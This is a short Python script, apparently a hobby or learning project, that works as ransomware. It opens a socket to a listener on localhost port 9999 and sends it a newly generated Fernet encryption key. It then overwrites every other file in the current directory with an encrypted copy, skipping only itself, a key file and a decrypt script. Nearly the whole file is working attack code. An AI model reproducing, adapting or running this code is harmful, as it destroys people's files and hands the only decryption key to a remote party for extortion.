import os
from cryptography.fernet import Fernet
import socket


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('localhost' , 9999))


files = []

for file in os.listdir():
    if file == "voldmort.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)


print(files)


key = Fernet.generate_key()
print(key)

client.send(key)
client.close()
'''
with open("thekey.key","wb") as thekey:
    thekey.write(key)
'''    

for file in files:
    
    with open(file,"rb") as thefile:
        content = thefile.read()

    content_encrypted = Fernet(key).encrypt(content)

    with open(file,"wb") as thefile:
        thefile.write(content_encrypted)